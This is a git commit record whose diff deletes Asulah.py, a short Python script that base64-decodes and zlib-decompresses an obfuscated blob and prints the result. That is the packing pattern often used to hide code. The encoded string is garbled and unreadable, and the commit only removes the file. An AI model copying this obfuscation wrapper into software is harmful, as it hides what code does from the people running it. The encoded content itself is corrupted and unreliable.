1f3ade78342345717b462b6d5b513a8fba3e7e24
KyaaZuu <98878723+KyaaZuu@users.noreply.github.com>
2022-04-08 16:12:22 +0700

    Delete Asulah.py

--- Asulah.py
+++
@@ -1,5 +0,0 @@
-import marshal,zlib,base64
-var = zlib.decompress(base64.b64decode("jh&jh(rGjhax"+z)hjh&$zax"+,kyb(b&jh(rGjh2)h)mg+v+kybmojhO*^jh-)jhx+)j�e'({zpv)(pvz^z)v))WZk{uv))WZk{vv))WZk{wv))WZk{xv))WZk{yv))WZk{zv))WZk{{v))WZk{|v))WZk{}v))WZk{uC)z^zz[)Wjk{qZ'
-+vw(b%yv+qYKz^zMYuMYuMYuMYuMYuMYuMYe7}fa"/r"q-)7Ig7}f-kznMkb%yuMYibt}&)WZk{t}z))}c"z5Kb"t}&)WZk{t}8kylMYt]4i"t}&u]jjwhjwhv{bk(rG$z(rG�_4D#+Du{i_bb,Zvk{bMY)N}"+\zi)Iz-$uZ&&bg!'y:zl@
-;(rGH1�v-*bhzz,zwmi]}`-$x'}&{k{RzmiyquZon*&r"q!W+,l $zM�2(w*iluZ~zguj}`-$x'}&{'jvvXjwhh)^N$z(rG$zDNR8"I4D�yrui+)jx)Zk{bMY)N}"+\zlrZ,zZrG(zkyl!'mv)NiZq-jmkybzqlz[axvqlaxvq-j"))
-print(var)
